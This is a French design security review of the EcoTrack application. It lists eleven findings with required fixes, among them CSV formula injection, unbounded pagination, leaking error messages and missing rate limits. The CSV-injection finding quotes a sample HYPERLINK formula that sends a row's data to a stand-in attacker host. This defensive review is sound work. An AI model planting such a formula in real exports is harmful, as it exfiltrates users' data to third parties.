# Revue de sécurité de la conception — EcoTrack

- **Objet** : `docs/sdd.md` v1.0, adossé à `docs/srs.md` v1.2 et aux ADR 001-005
- **Date** : 2026-07-29 · **Revue par** : agent `security-reviewer`
- **Portée** : conception uniquement (aucun code n'existe encore)
- **Verdict** : **conception acceptable sous réserve des 4 corrections bloquantes ci-dessous**

> Méthode : revue adversariale de la conception. On ne cherche pas à valider le
> document, on cherche ce qui peut être abusé. Les constats sont classés par
> gravité et chacun est rattaché à l'exigence ou au composant concerné.

---

## 1. Synthèse

| Gravité | Nombre | Statut attendu |
|---|---|---|
| 🔴 Bloquant | 4 | Corrigé au SDD **avant** tout code |
| 🟠 Important | 4 | Corrigé au SDD ou tracé en dette explicite |
| 🟡 Vigilance | 3 | À surveiller pendant l'implémentation |

Le point structurant : **l'absence d'authentification (arbitrage n°1) est
acceptable en soi, mais elle rend inacceptable tout autre relâchement**. Sans
authentification, chaque endpoint est ouvert à quiconque atteint le service ;
la moindre opération coûteuse ou non bornée devient une arme.

---

## 2. Constats bloquants

### 🔴 SEC-01 — Injection de formule CSV via `localite` (EX-F-04)

**Constat.** Le champ `localite` est un texte libre de 100 caractères, écrit
tel quel dans l'export CSV. Une valeur commençant par `=`, `+`, `-`, `@`, une
tabulation ou un retour chariot est interprétée comme une **formule** à
l'ouverture du fichier dans un tableur. Certaines constructions permettent
l'appel de ressources externes ou l'exécution de commandes selon la
configuration du poste.

**Scénario d'abus.** Un gestionnaire crée une parcelle dont la localité est
`=HYPERLINK("http://attaquant/"&A1,"Cliquez")`. Un collègue exporte le parc et
ouvre le fichier : les données de la ligne partent vers un tiers.

**Pourquoi c'est bloquant ici.** Le système accepte des saisies libres et
produit un fichier destiné à être ouvert dans Excel (le séparateur `;` retenu
en arbitrage n°5 le confirme). La chaîne d'exploitation est complète.

**Correction exigée au SDD.** Ajouter au contrat de l'export une règle
d'échappement : toute valeur de cellule commençant par `=`, `+`, `-`, `@`,
tabulation ou retour chariot est préfixée d'une apostrophe, et les guillemets
sont doublés avec encadrement systématique des champs. Cette règle appartient
à l'**adapter d'export**, pas au domaine. Test associé obligatoire :
`should_neutraliser_formule_when_localite_commence_par_egal`.

---

### 🔴 SEC-02 — Paramètre `size` de pagination non borné (EX-F-05, EX-NF-01)

**Constat.** Le contrat expose `GET /parcelles?page=0&size=50` sans borne
supérieure documentée sur `size`. Un appel `?size=1000000` déclenche le
chargement et la sérialisation de l'intégralité du parc.

**Scénario d'abus.** Sans authentification, quelques requêtes concurrentes à
`size` élevé suffisent à saturer la mémoire de l'API et à faire échouer la
sonde `liveness`, provoquant un redémarrage en boucle — et une indisponibilité
qui contredit frontalement EX-NF-02.

**Correction exigée au SDD.** Borner `size` à **100 maximum** (valeur au-delà :
rejet en 400, pas de troncature silencieuse), `page` à un entier positif. Même
borne sur `GET /alertes`. Documenter ces bornes dans le contrat §4, avec le
code de réponse associé.

---

### 🔴 SEC-03 — L'export CSV n'est pas paginé (EX-F-04, EX-NF-01)

**Constat.** L'export porte sur l'intégralité du parc (jusqu'à 5 000 parcelles,
H3) et le SDD ne précise ni pagination, ni limite, ni mode de production. Une
construction en mémoire de l'intégralité du fichier, sur plusieurs requêtes
concurrentes, produit le même effet que SEC-02.

**Correction exigée au SDD.** Spécifier une **production en flux**
(écriture progressive dans la réponse, lecture par lots côté base) plutôt
qu'une construction complète en mémoire, et une **limite absolue** de lignes
au-delà de laquelle l'export est refusé explicitement. Ajouter l'export au
périmètre du test de charge d'EX-NF-01, dont il est aujourd'hui absent.

---

### 🔴 SEC-04 — Fuite d'information par les messages d'erreur techniques

**Constat.** Le SDD prévoit RFC 7807 et interdit les détails internes
(EX-NF-05), mais la gestion des conflits 409 repose sur des contraintes
**base de données** (`UNIQUE(code)`, `UNIQUE(parcelle_id, date_observation)` —
ADR-002). Le comportement par défaut de Spring lors d'une violation de
contrainte est de propager un message contenant le nom de la contrainte, de la
table, voire un extrait de requête.

**Scénario d'abus.** L'attaquant provoque des conflits pour cartographier le
schéma, puis exploite les messages d'erreur pour identifier la version du SGBD
et affiner d'autres attaques.

**Correction exigée au SDD.** Spécifier un **gestionnaire d'exceptions global**
qui traduit toute exception non prévue en réponse générique (`500`, sans
détail) et chaque violation de contrainte connue en message métier neutre
(« un relevé existe déjà à cette date »). Interdire explicitement l'exposition
de la trace d'exécution et désactiver toute page d'erreur par défaut
(`server.error.include-*` à `never`). Test associé : aucune réponse d'erreur
ne contient de nom de table, de contrainte, de classe Java ni de version.

---

## 3. Constats importants

### 🟠 SEC-05 — Aucune limitation de débit ni de taille de requête

Sans authentification, rien ne limite le nombre de requêtes ni la taille des
corps envoyés. **Attendu** : borner la taille du corps des requêtes
(`server.max-http-request-header-size` et limite applicative), et prévoir une
limitation de débit au niveau de l'ingress en Phase 10. Tracer en dette
explicite si non traité en v1.

### 🟠 SEC-06 — Le journal des alertes n'a pas de politique de rétention

EX-F-07 R1 rend les entrées immuables, sans durée de conservation (le point
était ouvert en §9 du SDD). Croissance non bornée = dégradation progressive et
question de conformité si des données personnelles s'y ajoutent un jour.
**Attendu** : fixer une rétention (proposition : 24 mois, purge automatique
documentée) ou acter explicitement la conservation illimitée en v1.

### 🟠 SEC-07 — Table des publications d'events sans purge (ADR-003)

L'*event publication registry* persiste chaque event ; les publications
traitées s'accumulent indéfiniment. L'ADR le mentionne en conséquence négative
sans décision. **Attendu** : activer la purge des publications traitées et
fixer un délai de conservation des publications **non** traitées, avec
supervision (une publication non traitée = une alerte manquante au journal,
donc une violation silencieuse d'EX-NF-03).

### 🟠 SEC-08 — Absence de journalisation des accès et opérations

Aucune exigence ni conception de journalisation applicative. Sans
authentification **et** sans journal, une opération anormale est indétectable
et non imputable a posteriori. **Attendu** : journaliser les opérations
d'écriture (création de parcelle, enregistrement de relevé, export) avec
horodatage et origine, **sans jamais journaliser de secret**, et proscrire la
journalisation en clair de corps de requête complets.

---

## 4. Points de vigilance pour l'implémentation

- **SEC-09 — Chaîne de confiance du proxy Next.js.** Le routage retenu
  (navigateur → `web` → `api`) implique que l'API ne doit **jamais** être
  joignable directement depuis l'extérieur en dehors des besoins de test.
  Le SDD note que le port 8080 reste exposé en staging pour les tests
  RestAssured : c'est un écart assumé, à supprimer en production. À ne pas
  reconduire par habitude dans les manifests de la Phase 10.
- **SEC-10 — Confiance du frontend envers l'API.** La validation zod protège
  contre les dérives de contrat, pas contre l'injection dans le rendu. Aucune
  insertion de HTML brut à partir de données saisies (`dangerouslySetInnerHTML`
  interdit) — le rendu React échappe par défaut, il ne faut pas le contourner.
- **SEC-11 — Images et exécution non privilégiée.** Déjà prévu au TP
  (utilisateur non-root, images minimales, scan Trivy bloquant). À vérifier
  identiquement sur **les deux** images, `api` et `web`.

---

## 5. Modifications à apporter au SDD avant le Checkpoint 2

1. §4 Contrat d'API : bornes de `page` et `size` (max 100), codes de réponse
   associés (SEC-02).
2. §4 : gestionnaire d'erreurs global, aucune fuite de schéma ni de trace,
   messages de conflit neutres (SEC-04).
3. §5 / §3 : règle d'échappement CSV dans l'adapter d'export (SEC-01).
4. §4 : export en flux, limite absolue de lignes, inclusion au test de charge
   (SEC-03).
5. §3.4 : politique de rétention du journal et purge des publications d'events
   (SEC-06, SEC-07).
6. §7.2 : ajouter les tests de sécurité correspondants à la liste des tests non
   négociables.

---

## 6. Ce que la conception fait bien

À signaler, car ces choix évitent des vulnérabilités classiques :

- La validation dans les **objets de valeur** rend une entrée invalide
  impossible à représenter en mémoire : la validation n'est pas contournable
  par un chemin d'appel oublié.
- **Aucun champ `statut` ni `taux` en écriture** (EX-NF-07) : la falsification
  de l'indicateur métier central est structurellement exclue.
- Le **404 sur fonctionnalité désactivée** (ADR-004) ne révèle pas l'existence
  d'une fonction non livrée.
- Les **contraintes en base** en plus de la validation applicative couvrent les
  écritures concurrentes que la validation seule laisserait passer.
- Le **domaine sans dépendance framework** réduit la surface exposée aux
  vulnérabilités de désérialisation et de proxy.

---

*Cette revue est un document de projet : elle est versionnée et toute
modification passe par une Pull Request. Les constats non traités doivent être
tracés en dette explicite, jamais silencieusement abandonnés.*
